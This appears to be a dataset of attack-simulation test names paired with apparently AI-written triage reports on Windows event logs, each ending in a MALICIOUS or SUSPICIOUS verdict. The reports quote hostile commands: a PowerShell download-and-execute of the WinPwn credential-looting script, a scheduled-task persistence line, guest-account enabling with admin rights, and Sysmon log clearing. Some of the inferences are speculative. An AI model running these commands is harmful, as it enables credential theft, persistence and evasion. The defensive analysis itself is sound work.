WinPwn - Loot local Credentials - Safetykatz,"### Detailed Analysis of the Logs

Upon reviewing the provided logs, several entries suggest potentially malicious activity, particularly the execution of PowerShell commands. Below are the key findings from each log:

#### **System Log**

- The System logs primarily contain information relating to usual kernel operations, such as time adjustments. 
- The frequent use of `svchost.exe` as a parent process for time setting is typical behavior and does not directly indicate malicious activity. 
- No anomalies or indicators of malicious activity were directly detected from the system logs.

#### **Security Log**

- Security logs contain a few `EventID 4616` records indicating the system time was changed. There is no direct evidence from these logs that suggest this is an activity to hide malicious actions.

#### **Application Log**

- Entries in the Application log are generally related to standard Windows operations, such as Windows Defender being active or the Edge Update service operating. 
- There are no entries here that immediately indicate malicious behavior.

#### **Sysmon Log**

- Notably, there are multiple instances of `wevtutil.exe` and `conhost.exe` being utilized by the `admin_test` user. While these operations themselves can be legitimate, their repeated concurrent execution can indicate log tampering or process redirection.
- Execution of `powershell.exe` by `admin_test` user with high integrity context and downloading content from an external source (i.e., `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`) strongly suggests malicious intent. The referenced script, `WinPwn.ps1`, is associated with penetration testing or potential exploitation.

#### **Windows PowerShell Log**

- The execution of a PowerShell script pulled from a GitHub repository without verification is a red flag. The specific script URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`) points towards attempting to execute unauthorized code, potentially aimed at extracting sensitive information or gaining control of administrator rights.

### Assessment of Situation

- The execution of PowerShell with a script drawn from an unauthorized or suspicious source points towards malicious activity. The script appearing to be used (`WinPwn.ps1`) can be employed for reconnaissance or exploitation in systems, which is common in compromised environments.
- These activities suggest that the `admin_test` user account might have been compromised or is being used to conduct unauthorized and potentially harmful operations.

### Threats and Risks Identified

1. **Unauthorized Execution of Scripts**: Running scripts from the internet without validation poses a risk of malicious code being executed.
2. **Compromise of User Accounts**: The `admin_test` user account appears to be used for suspect activities, indicating potential unauthorized access or malicious use.
3. **Potential for Elevated Privilege Actions**: Using PowerShell with high integrity level and downloading scripts can lead to privilege escalation or system compromise.

### Guidance on How to Proceed

1. **Immediate Investigation of User Accounts**: Inspect the `admin_test` account for unauthorized access and review all associated permissions. Consider password change and further monitoring.
2. **Network Traffic Analysis**: Review network logs to identify any external connections that may indicate data exfiltration or further dropper scripts being downloaded.
3. **Endpoint Protection Measures**: Deploy endpoint detection to monitor and block further execution of malicious scripts and alert on suspicious `powershell.exe` activity.
4. **Comprehensive System Audit**: Check system configurations, installed applications, and logs for persistent threats or malware.
5. **User Awareness and Security Training**: Ensure ongoing training for identifying phishing and suspicious activities, preventing similar incidents.

### Resolution

**MALICIOUS** - The logs contain clear indicators of malicious activity, particularly with the scripted download and execution via PowerShell. Immediate actions are required to mitigate potential security breaches."
Download Macro-Enabled Phishing Attachment,"### Detailed Analysis

#### Windows PowerShell Logs
- The series of PowerShell logs indicates the execution of a script that downloads a file (`PhishingAttachment.xlsm`) from an external URL hosted on GitHub (`https://github.com/file/file-file/raw/master/files/data.001/bin/PhishingAttachment.xlsm`) and saves it in the temporary directory.
- The use of `Invoke-WebRequest`, along with setting the security protocol to TLS 1.2, is a typical pattern seen in malicious scripts attempting to download and execute payloads from the internet.
- The filename `PhishingAttachment.xlsm` suggests it could be a macro-enabled Excel file, often used in phishing attacks to execute further code when opened.

#### Security Logs
- There are multiple `4616` events indicating a change in the system time. Changes to the system time can sometimes indicate an attempt to bypass security mechanisms that rely on time-sensitive operations, like expiration validation or logging consistency. However, since these were performed by `svchost.exe` under a `LOCAL SERVICE` account, this might not be related to malicious actions directly but rather a service operation.

#### Application Logs
- The Software Protection Platform Service event appears normal, noting a rules engine operation without any signs of malicious activity.

#### Sysmon Logs
- Frequent execution of `wevtutil.exe` and `conhost.exe` under the `admin_test` user account is noted. These could be legitimate activities if used for log maintenance or command line interface operations but may warrant further investigation based on context.
- The process `whoami.exe` is executed by `admin_test`, which may suggest an attempt to verify current user privileges or identity during a script executionâ€”a common step in post-exploitation actions.
- Multiple instances of `EdgeUpdate` processes are noted, updating Microsoft Edge, which appears standard unless coupled with suspicious network activity.
- The repeated execution of `powershell.exe`, which is consistent with PowerShell logs, indicates the execution of suspicious scripts.

#### System Logs
- Several time-setting operations are noted here, aligning with Security Logs, and while these logs are benign on their own, they may indicate attempts to manipulate time settings possibly to evade detection mechanisms, though this is speculative without corroborating evidence.

### Assessment
- **Indicators of Compromise (IoC):** The PowerShell script usage to download an external file suggests potential compromise or a phishing attempt with possible malicious payload delivery.
- **Threats and Risks:** The downloaded file presents a probable risk of further execution by an end-user leading to potential compromise from either malware or unauthorized access vectors. If executed, this could lead to exploitation of privileges or data exfiltration.

### Final Resolution
- **MALICIOUS:** Based on the analysis, the PowerShell activity is deemed malicious due to the nature of downloading a suspicious file from an untrusted external source, commonly associated with phishing attacks. 

### Guidance on How to Proceed
1. **Isolation:** Immediately isolate the affected host to prevent any potential spread of malware or further unauthorized actions.
2. **Investigation:** Perform a deeper forensic analysis of the host to identify any subsequent actions following the PowerShell execution, especially focusing on the opened file or processes spawned post-download.
3. **Containment and Eradication:** Remove any suspicious files or programs installed on the system stemming from the identified activity.
4. **Monitoring and Recovery:** Enhance network monitoring to detect similar activities in the future and review security policies to prevent execution of scripts from untrusted locations.
5. **Audit and Review:** Conduct an audit of user actions and permissions, especially focusing on `admin_test` activities, and ensure that users adhere to least privilege principles. 

6. **Education and Security Awareness:** Consider educating users about phishing risks, especially related to opening and executing files from unknown sources."
Create local account with admin privileges,"Upon analyzing the provided event logs, the following key observations and suspicious activities were identified:

### Key Suspicious Findings:

1. **Creation and Manipulation of User Accounts:**
   - **Event ID 4720 (User Account Created)** - A new user account `art-test` was created by `admin_test` on `SERVER002`.
   - **Event ID 4722 (User Account Enabled)** - The same user account `art-test` was enabled shortly after its creation.
   - **Event ID 4738 (User Account Changed)** - Modifications were made to the `art-test` account following its creation and enabling.
   - **Command Execution from Sysmon Logs:**
     - Execution of `cmd.exe` with parameters to add a user `art-test`, set a password, and add the user to the administrators group. This command was executed with high integrity level, implying elevated privileges.
     - Sequence of execution: net user add, setting password, and adding to administrators group indicates scripted or automated account manipulation, often seen in malicious infiltration or persistence techniques.

2. **Unusual Process Executions and Privilege Escalation:**
   - The user `admin_test` executed a series of processes with high integrity levels such as `whoami.exe`, `cmd.exe`, `net.exe`, and `conhost.exe`. The command execution, especially involving the creation and privilege escalation of a new user account, is not typical for average administrative tasks.

3. **Privilege Escalation:**
   - Event ID 4672 logged 'Special privileges assigned to new logon', with privileges such as SeDebugPrivilege, which is potentially concerning if not part of expected administrative activity.

4. **Time Synchronization Events:**
   - There was a change in system time (Events 4616 from Security log and corresponding events in System log), however, this could align with legitimate time synchronization activities.

### Assessment of the Situation:
The sequence of events where a new user account was created, enabled, modified, and given administrative privileges is a strong indicator of unauthorized use and potentially malicious activity. The manipulation and control of user accounts, especially via scripted commands, suggests methods used in lateral movement or establishing persistence within a system.

### Identified Risks:
- Elevating privileges of a potentially unauthorized account `art-test`.
- Potential backdoor creation by adding unauthorized accounts to administrator groups.
- Unauthorized access to sensitive information or resources due to elevated privileges.
  
### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Disable and review the `art-test` account for any unauthorized access or changes.
   - Review the user permissions and actions of `admin_test` to validate the legitimacy of activities.
   - Analyze further logs around this timeframe for other indicators of compromise.

2. **Monitoring and Investigation:**
   - Continuously monitor similar account alterations or privilege escalations on critical systems.
   - Implement alerts for user account changes, particularly user creation and privilege modifications.

3. **Security Measures:**
   - Consider auditing high-integrity commands and ensure they align with company policy and least privilege principles.
   - Review group policies and ensure user accounts have the correct roles and permissions assigned.

### Resolution:
Based on the detailed analysis and the indicators of unauthorized and potentially malicious actions within account creation and privilege assignments, the resolution is:

**MALICIOUS** - The logs indicate activities consistent with account compromise and unauthorized access elevations, warranting immediate action and further investigation."
Activate Guest Account,"### Analysis of Provided Logs

Upon reviewing the provided Windows event logs from the Application, Sysmon, Security, and System logs, I have highlighted and analyzed the following observations:

#### Sysmon Log Analysis
1. **Command Execution**:
    - The execution of `""cmd.exe"" /c net user guest /active:yes` by user `SERVER002\admin_test` is notable. This command enables the 'Guest' account, which is commonly disabled for security reasons as it can be used to gain unauthorized access. It indicates a potential attempt to escalate privileges or bypass certain security controls. The process chain appears to be initiated from `wsmprovhost.exe`, which could be part of a scripted or remote operation.

2. **Frequent Execution of System Utilities**:
    - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed are recorded around the same timestamps. While these could be part of legitimate administrative tasks, when combined with other suspicious activities, they could potentially indicate log clearing attempts or masquerading attempts.

3. **System Integrity Verification Commands**:
    - Execution of `whoami.exe` was observed, which might be an attempt to verify the identity of the currently logged-in user or check what privileges are held. This could be indicative of reconnaissance activities by an intruder.

#### Application and System Log Analysis
1. **Edge Update Service Activity**:
    - The `edgeupdate` services have numerous starts and stops, which might typically be non-suspicious during routine updates. The logs do not immediately suggest malicious intent but should be contextually analyzed alongside other logs to rule out misuse of legitimate services.

#### Security Log Analysis
1. **Time Modification Events**:
    - The manipulation of the time recorded by event ID 4616 suggests a discrepancy in time settings or changes to system time. Such changes could be benign due to time synchronization processes but could also be a red flag if used to align with malicious activities like log manipulation.
   
2. **Account Changes and Privileges**:
    - Event IDs 4722 and 4738 signify account and privilege adjustments, specifically involving the `Guest` account, corroborating with the cmd-based enabling of the account seen in the Sysmon logs.

### Assessment of the Situation
The activity observed in the logs suggests potential malicious behavior due to:
- Enabling of a potentially disabled account, `Guest`, which is a critical vulnerability if exploited.
- A sequence of command-line activities involving system utilities and potential obfuscation of tracks via time changes.

### Resolution
**Resolution: MALICIOUS**

### Guidance and Recommendations
- **Immediate Actions**: Disable the 'Guest' account immediately and ensure that account policies are being enforced. Check for any newly created accounts or changes in the system configuration.
- **Forensic Investigation**: Conduct a deeper forensic investigation on SERVER002 to determine if there is active remote access or backdoors set up by malicious actors.

Further investigation could reveal more about the nature and extent of compromise, and whether additional systems might be affected."
Enable Guest account with RDP capability and admin privileges,"Upon analyzing the provided Windows event logs, several items of concern were identified that suggest potential malicious activity:

### Indicators of Malicious Activity:

1. **Command Line Operations:**
   - There is evidence of the `cmd.exe` process executing a series of commands to modify user accounts within the system. Specifically:
     - The `guest` account was made active, a password was set (`Password123!`), and it was added to both the `Administrators` and `Remote Desktop Users` groups. This is highly suspicious as it indicates an attempt to elevate privileges and potentially allow remote access.
     - System registry settings were altered to enable Remote Desktop connections. This change can potentially allow attackers remote access to the system.

2. **User Elevation and Account Changes:**
   - The `admin_test` account executed the commands which escalated the privileges of the `guest` account and modified system settings for Remote Desktop connections.
   - Security logs confirmed changes to the `guest` account status (ID 4722), password (ID 4724), and its addition to the `Administrators` group (ID 4732).

3. **Suspicious Process Executions:**
   - Multiple instances of the Windows tool `wevtutil` were executed by `admin_test`, which is associated with exporting, archiving, or clearing Windows event logs. This activity might indicate an attempt to cover tracks.
   - Legitimate processes like `hostname.exe` and `whoami.exe` were executed, potentially indicative of recon activities to determine the machine name and logged-in user.

4. **Time Change Events:**
   - The system time was changed (Event ID 4616), which could be an attempt to disrupt log correlation across different logs to obscure malicious activity timing.

### Assessment of the Situation:
The actions taken on the system demonstrate clear intent to ensure continued and elevated access to the system by modifying critical user accounts and system settings. The presence of elevated privilege assignments, changes to remote access capabilities, and suspicious use of system utilities strongly indicate a potential security breach.

### Identified Threats/Risks:
- Unauthorized privilege escalation.
- Potential unauthorized remote access due to changes in Remote Desktop settings.
- Possible attempts to conceal actions through system event modifications.

### Guidance on How to Proceed:
1. **Immediate Isolation:** Disconnect the system from the network to prevent further unauthorized access.
2. **Thorough Investigation:** Conduct a full forensic investigation to determine the extent of the breach and identify any unauthorized access or data exfiltration.
3. **Account Audit and Remediation:** Reset passwords for the `guest` and `admin_test` accounts, and review all other accounts for anomalous activity. Remove the `guest` account from privileged groups.
4. **System Hardening:** Revert any unauthorized changes in system settings, especially regarding remote access. Implement additional security controls such as multi-factor authentication and enhanced logging.
5. **Preventative Measures:** Increase monitoring on critical systems for similar activities and ensure alerts are configured for suspicious user activity and system changes.

### Final Resolution:
- **MALICIOUS**: The activities observed in the logs, including privilege escalation, user account modification, and enabling remote access, clearly indicate malicious intent and actions requiring an immediate response."
Word spawned a command shell and used an IP address in the command line,"Upon analyzing the provided event logs, there are multiple indicators of potential malicious activity that include the following:

1. **PowerShell Activity**:
   - The PowerShell log entries indicate the execution of a script downloaded from a remote URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`). The script appears to be executing commands using `Invoke-MalDoc` with a macro code, potentially indicative of a macro-based attack.
   - The usage of `Invoke-MalDoc` strongly suggests suspicious activity, often associated with exploitation or malware used to deliver malicious payloads via document macros.

2. **Process Creation Events in Sysmon Logs**:
   - Multiple occurrences of PowerShell processes (`powershell.exe`) and corresponding commands executed as seen in the event logs point towards scripted automation or potentially malicious intent.
   - The PowerShell script seems to be establishing an external connection, fetching and possibly executing additional code.

3. **Security Log Indicators**:
   - Event ID `4672` indicates a special privileges assignment to the SYSTEM user which is normal, but when considered with the PowerShell activity involving downloading and executing scripts, it is suspicious.
   - Several credential attempts involving Microsoft accounts and `WindowsLive` are noticeable, which might further imply suspicious behavior, even if these attempts failed as seen in Event ID `5379`.

4. **Execution of Host Processes and Services**:
   - Although Sysmon events show Edge Update processes running, the combination of benign and legitimate system activities alongside suspicious PowerShell downloads and macro invocations necessitates caution.

**Assessment**:
- **MALICIOUS**: The activity observed in the logs indicates a high likelihood of a malicious attack using PowerShell to fetch and execute potentially harmful scripts. The repeated automation of tasks and association of scripts that may initiate macro-based attacks highlight a probable cyber threat.

**Resolution and Guidance**:
- Immediate containment measures should be implemented on the affected host, SERVER002, to prevent further spread or re-exploitation.
- Conduct a thorough forensic investigation to identify any further components of the payload delivered or persistence mechanisms that may have been installed.
- Review and enhance monitoring to capture similar activities in real time.
- Consider engaging digital forensics and incident response (DFIR) resources to perform a detailed investigation and remediation process.
- Educate the user base on the dangers of executing scripts from untrusted sources and enable strict execution policies within PowerShell to mitigate future risks."
Octopus Scanner Malware Open Source Supply Chain,"Upon analyzing the provided Windows logs, the following observations and assessments have been made:

### Suspicious Behavior Identified:
1. **PowerShell Execution**:  
   - There is a process execution of `powershell.exe` with the user `SERVER002\admin_test`. This is noteworthy as attackers often leverage PowerShell for executing malicious scripts or commands. However, the specific command executed is not evident in the logs, indicating the need for more investigation.
   
2. **Frequent Use of `wevtutil.exe`**:  
   - The `wevtutil.exe` tool was executed several times by the user `SERVER002\admin_test`. `wevtutil.exe` is commonly used to manage event logs and can be used to clear logs or harvest log data, both actions that could be considered suspicious during an intrusion.

3. **Command Prompt Execution with Potential Indicators of Task Scheduling**:
   - The `cmd.exe` was executed with a suspicious command line: `""cmd.exe"" /c copy %%temp%%\\ExplorerSync.db %%temp%%\\..\\Microsoft\\ExplorerSync.db & schtasks /create /tn ExplorerSync /tr ""javaw -jar %%temp%%\\..\\Microsoft\\ExplorerSync.db"" /sc MINUTE /f`. This suggests an attempt to create a scheduled task named ""ExplorerSync"" which runs a Java application, potentially indicating persistence mechanisms used by malware.

4. **Scheduled Task Creation**:
   - The use of `schtasks.exe` to create a scheduled task (`ExplorerSync`) associated with running Java, as seen from the command line, raises a red flag as attackers often use scheduled tasks to maintain persistence.

5. **Usage of Tools for Network Configuration and System Information**:
   - Tools like `HOSTNAME.EXE` and `whoami.exe` were seen in use, which can be legitimate but often used by attackers for reconnaissance to understand the compromised environment.

### Indicators of Malicious Activity or Compromise:
The sequence of events involving process executions, especially with the suspicious use of `cmd.exe`, `schtasks.exe`, and potential PowerShell activity by a user indicative of administrative privileges, strongly suggests that there might be unauthorized or malicious activity aimed at establishing persistence and potentially conducting further operations on the system.

### Assessment and Resolution:
- The presence of such activities, especially regarding the scheduled task creation and the command line which indicates Java application execution at a frequent interval using a scheduled task, are concerning and align with tactics often seen in compromised environments.

**Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Incident Response**: Isolate the affected system from the network to prevent further spread or operations by the potential threat actor.
2. **Thorough Analysis**: Conduct a detailed investigation by looking into other logs, such as PowerShell logs, network logs, and file integrity monitors for more context or any other malicious indicators.
3. **Review Scheduled Tasks**: Check for any unauthorized or suspicious scheduled tasks and disable them. Investigate the content and origin of `ExplorerSync.db`.
4. **Verify User Activity**: Review user `SERVER002\admin_test` activities through user activity logs and assess if credentials have been compromised.
5. **System and Network Scanning**: Use security tools to scan for malware signatures, rootkits, or other persistence mechanisms on the host and within the network.
6. **Security Update and Patching**: Ensure that all systems are patched and all security tools are updated.
7. **User Training and Awareness**: Conduct a security awareness session for users to recognize suspicious activities and phishing schemes.

By taking these steps, one can address the possible penetration and safeguard the system against further malicious activities."
Use PsExec to elevate to NT Authority\SYSTEM account,"Based on the analysis of the provided Windows event logs, several events and activities stand out as indicators of potential malicious activity:

1. **Log File Clearing (Security and System Logs)**: 
   - Multiple instances of cleared logs are detected (`EventID 1102` in Security logs and `EventID 104` in System logs) by the user `admin_test`. This is highly suspicious as it indicates potential log tampering to hide malicious activity.

2. **PsExec Usage**:
   - The presence of `PsExec` being executed (`PSEXESVC.exe` and associated command lines) indicates lateral movement or remote execution attempts which are common in attack scenarios. PsExec usage is a known technique for attackers to execute commands on remote systems.

3. **Commands with High Privileges**:
   - Several command executions under the `SYSTEM` account, using tools like `wevtutil.exe`, `cmd.exe`, and `whoami.exe`, which appear to correlate with typical enumeration and privilege discovery steps in an attack chain.
   - Commands like `whoami` executed through `PsExec` show efforts to enumerate system users or establish current privileges.

4. **Clearing of Sysmon Logs**:
   - Execution of `wevtutil.exe` with the `cl Microsoft-Windows-Sysmon/Operational` command-line arguments shows deliberate attempts to clear Sysmon logs, which is indicative of an effort to remove tracks of malicious activities.

5. **Mismatch in Typical Activity**:
   - The machine name suggests this is a server (`Server002`), yet there are logons and activities indicating direct user interactions (`admin_test`), which is atypical for a server not used as a workstation.

### Assessment:
Given these observations, the activity showcased in the logs involves potential tampering with logs, unauthorized execution of commands, use of tools typically associated with lateral movement or remote control, and possible privilege escalation tactics. These actions align with behaviors observed in malicious activities.

- **Further Investigation**: Conduct detailed forensic analysis on the host to uncover the full extent of compromise. Check for additional persistence mechanisms or other compromised accounts.
- **Review Access Controls**: Ensure only authorized users have elevated privileges, and evaluate current security protocols for gaps that could allow similar activities.
- **Enhanced Monitoring**: Implement more robust monitoring and auditing to capture and alert on similar patterns in real-time.

### Resolution:
- **MALICIOUS**: The collected logs contain clear evidence of malicious activities. Immediate action is required to address the potential compromise and mitigate risks to the organization's security posture."
WinPwn - Loot local Credentials - powerhell kittie,"Based on the provided Windows event logs, here is a detailed analysis of suspicious or anomalous activities, indicators of malicious activity, and my assessment of the situation:

### Analysis

#### Windows PowerShell Logs
1. **Suspicious PowerShell Execution:**
   - The PowerShell log entries indicate the execution of PowerShell commands with a script hosted on GitHub under the repository `S3cur3Th1sSh1t`, specifically the `WinPwn.ps1` script.
   - The command executed is:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive}
     ```
   - This script execution is known for exploiting Windows and collecting credentials, which is indicative of malicious activity. The use of a command like `iex` (Invoke-Expression) is particularly suspicious as it's often used for downloading and executing scripts directly from the internet.

#### Sysmon Logs
1. **Process Execution and Creation:**
   - Multiple executions of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` under an admin context (`SERVER002\\admin_test`) could be indicative of process injection or evasion techniques.
   - The host application for these processes often points back to PowerShell, aligning with the malicious PowerShell activity detailed above.

#### Security Logs
1. **Privileged Actions:**
   - Security logs indicate privileges such as `SeDebugPrivilege` and others were held by the `admin_test` user, which may suggest an attempt for privilege escalation.

#### Network and User Intelligence
- **IP Address and Connection:**
  - Connections via network addresses like `fe80::e3b5:5371:12a8:9c77` could suggest remote access or data exfiltration methods are deployed.
- **Anomalies with NT AUTHORITY and SYSTEM Services:**
  - The presence of NT AUTHORITY privileges accessing unusual processes or directories might indicate an attempt to pivot within the system.

### Assessment

- The combination of PowerShell script executions for known malicious scripts, unusual system process executions, and high-level privileges linked to the suspicious admin user contributes to the assessment that this activity is indeed malicious. The suspicion is further supported by the download and execution of code directly from an external source without proper authorization or validation.

### Recommendation

- **Immediate Actions:**
  - Isolate the affected host (`Server002`) from the network to prevent further malicious activity.
  - Conduct a comprehensive forensic analysis to determine the extent of the compromise, specifically related to credential theft and data exfiltration.
  - Change all potentially compromised credentials, especially those with elevated privileges.

USB Malware Spread Simulation,"## Analysis of Windows Event Logs

### Suspicious or Anomalous Behavior

#### Windows PowerShell Log
- **Script Execution:** The PowerShell logs indicate the execution of a script that identifies removable drives and attempts to create a file (`dataTest1.txt`) on them. The content of the file includes a comment indicating that the action is to ""simulate malware spread to removable drives."" This script behavior is suspicious as it mimics tactics often used by malware to propagate via removable media.

#### System Log
- **Time Synchronization/Change:** The system logs contain time synchronization events. While frequent time changes can sometimes be indicative of certain malicious activities like evading detection, in this context, there's no direct evidence of tampering with the system time for malicious purposes.

#### Application Log
- **Windows Defender Active:** The log entry showing Windows Defender is active (SECURITY_PRODUCT_STATE_ON) suggests that the system's built-in antivirus protection is functional, which can help in mitigating some threats.

#### Sysmon Log
- **Process Execution:** Multiple executions of standard Windows utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) are observed. While these executions can be legitimate, if associated with unauthorized or unexpected activities, they might indicate reconnaissance activities or an attempt to gather system information by an attacker.
- **PowerShell Process:** The same PowerShell script identified in the PowerShell logs appears here, confirming its execution with the associated command line. This reiteration suggests the script is active on the system.

#### Security Log
- **Time Changes:** Corroborates time change events present in the System and Sysmon logs. Time changes alone are not inherently suspicious, but if frequent or occurring alongside other anomalous activities, they could be of concern.

### Indicators of Malicious Activity
- **PowerShell Script:** The script aims to spread to removable drives, a common tactic for malware dissemination. The explicit mention of simulating malware spread demonstrates intent to mimic (if not conduct) malicious actions.
- **Overall Process Execution Pattern:** The sequence and combination of processes executed do not portray a standard operation pattern for a server under typical conditions, particularly for a high-profile machine like the CEOâ€™s. 

### Assessment of the Situation
- **Threat or Risk Identified:** The execution of the PowerShell script is the primary indicator of potentially malicious or unauthorized behavior. The script's stated purpose to simulate malware propagation raises significant alarm.

### Guidance
1. **Immediate Action:**
   - Isolate the machine from the network to prevent further spread until a full forensic investigation is complete.
   - Conduct a full virus scan with a reliable and updated antivirus solution to identify any residing threats.
   
2. **Further Investigation:**
   - Examine the origin of the PowerShell script: determine if it was executed by a user, a scheduled task, or through unauthorized access.
   - Review user activity logs to identify any signs of compromised credentials or unauthorized access.

3. **Mitigation Measures:**
   - Ensure all systems have the latest security updates and patches.
   - Review and enhance access controls around critical systems, employing the principle of least privilege.
   - Educate key staff, especially high-profile users, on the risks of removable drive usage and secure handling practices.

### Resolution
The investigation strongly suggests **MALICIOUS** activity given the script's purpose and context, requiring immediate containment and investigation."
Azure Persistence Automation Runbook Created or Modified,"**Analysis of Logs**

**Windows PowerShell Log:**
The PowerShell log entries indicate the execution of a script that connects to Azure using credentials stored in variables. The command uses the `ConvertTo-SecureString` and `New-Object` cmdlets to create credentials and connects to Azure using `Connect-AzAccount -Credential $creds`. The script then attempts to create a new Azure Automation Runbook with unspecified parameters such as Resource Group Name and Automation Account Name, only providing a description ""my-test-runbook"".

1. **Anomalous Behavior:**
   - Use of `ConvertTo-SecureString -AsPlainText -Force`: This is considered poor practice as it potentially exposes passwords. The script is converting an empty string which suggests the command wasn't fully executed as intended.
   - A key indicator of suspicious activity is using automation or scripting interfaces to interact with cloud services in a non-standard or unusual pattern, especially from high-profile accounts like a CEO.
   
2. **Assessment:**
   - **Activity seems suspicious** given the context (CEO machine) and the potential for exploitation or misconfiguration leading to unauthorized access or changes in Azure resources.

**Sysmon Log:**
- A series of processes executed by `admin_test` user on Server002 suggest a sequence of executing known tools (`whoami`, `hostname`, and `PowerShell.exe`). Notably:
  - **Execution of `wevtutil.exe` and `conhost.exe`:** This may indicate attempts to manipulate or view event logs, which is a technique often used to cover tracks.
  - **`PowerShell.exe` used with a complex command-line argument:** Matches with the PowerShell logs showing attempts to manage cloud resources.

1. **Anomalous Behavior:**
   - The presence of events pointing to script-based credentials and automation indicates suspicious behavior, especially given the involved account is `admin_test`.
   - Using `sysadmin` tools suggests an attempt to query system state or perform actions typically related to reconnaissance or stealth activities.
   
2. **Assessment:**
   - **Activity is bluntly suspicious**â€”uses of PowerShell from a potentially administrative context with scripting tied to cloud resources are notable red flags.

**Conclusion:**
Based on the logs provided, the sequence of actions identified across PowerShell and Sysmon logs presents a picture of potentially suspicious activity involving cloud service management and possibly tampering with event logs. The absence of application and security logs adds to the concern, as complete context cannot be established but the existing information is troubling.

**Resolution:**
- **SUSPICIOUS**: The activity appears unusual and requires further investigation, especially due to the potential implications of a high-profile account being involved in cloud management with poorly managed credentials. It is recommended to conduct a detailed investigation and audit Azure resources for any unauthorized changes and review access management controls.

**Guidance:**
- Conduct a deeper investigation to understand the context of the script execution and validate user intent.
- Review Azure AD and Azure activity logs to identify any unintended or unauthorized actions.
- Strengthen and guide the removal of inadequately secure scripts/scripts management within your environment."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Based on the provided Windows event logs, several observations and assessments can be made:

### Observations:

1. **Security Log Events:**
   - Multiple security events (Event ID 4624) indicate successful logons using the SYSTEM account with LogonType 5 (service logon), which is typical for system services and not inherently suspicious.
   - Privileges were obtained in some of these events by the SYSTEM account (Event ID 4672), which include high-level rights such as SeDebugPrivilege and SeImpersonatePrivilege. While these are powerful privileges, they are not unusual for service accounts.

2. **Windows PowerShell Log:**
   - A PowerShell script was executed that creates registry entries under `HKLM\Software\Wow6432Node\Google\Chrome\Extensions` and modifies the `update_url` property for Chrome extensions, followed by starting and stopping Chrome. This could be indicative of persistence or monitoring attempts using browser extensions. The extensions listed (""fcfhplploccackoneaefokcmbjfbkenj"" and ""fdcgdnkidjaadafnichfpabhfomcebme"") should be reviewed for association with known malware.

3. **Sysmon Log:**
   - Several entries (Event ID 1, which logs process creation) show normal Windows processes being started by SYSTEM and Network Service accounts. The presence of `powershell.exe` started by `admin_test` running what appears to be the same PowerShell script identified in the PowerShell logs raises suspicion as it associates potentially unauthorized or malicious scripting with a user account.
   - The creation and execution of system processes like `whoami.exe`, `hostname.exe`, `wevtutil.exe` by `admin_test` suggest attempts to gather system information or manipulate logs, which can be indicative of lateral movement or obfuscation attempts.

4. **Application Log:**
   - These logs do not show immediate signs of concern. Windows Defender is registered as active (`SECURITY_PRODUCT_STATE_ON`), which indicates that at least at this time, some level of baseline security monitoring was active.

5. **Indicators of Compromise (IoCs):**
   - The suspicious PowerShell script activity and registry manipulations intended for Google Chrome extensions are particularly concerning as Chrome extensions can be abused for data exfiltration or drive-by compromises.
   - The `wevtutil.exe` entries possibly indicate an attempt to query or clear event logs to cover tracks.

### Assessment and Conclusion:

- **Suspicious Behavior:**
  - The PowerShell activities suggest an attempt to install or manage custom Chrome extensions, potentially for malicious purposes. This is not standard behavior on a CEO's machine and should be treated with caution.
  - Activities by the `admin_test` account raise concerns, especially given its association with manipulations typically used in malicious actions (e.g., system reconnaissance, potential log tampering).

- **Resolution: SUSPICIOUS**
  - The presence of scripted Chrome extension instantiation and potential cleanup activities linked to system processes command further investigation to determine the intent, origin, and potential impact.
  
### Guidance:

1. **Immediate Actions:**
   - Isolate the machine to prevent further potential lateral movement or data exfiltration.
   - Conduct a deeper forensic analysis to determine the source and scope of the suspicious PowerShell script execution.
   - Review and audit the `admin_test` account activities, permissions, and access logs to determine any anomalies or misuse.

2. **Further Investigation:**
   - Examine the Chrome extensions associated with the IDs found in the registry entries.
   - Check for known hashes or signatures of these extensions against threat intelligence databases.
   - Review policy violations and evaluate whether all legitimate software and scripts are accounted for and authorized.

3. **Monitoring and Response Enhancements:**
   - Strengthen PowerShell and scripting execution policies to reduce exposure to similar future threats.
   - Enhance logging and monitoring to detect similar anomalies promptly."
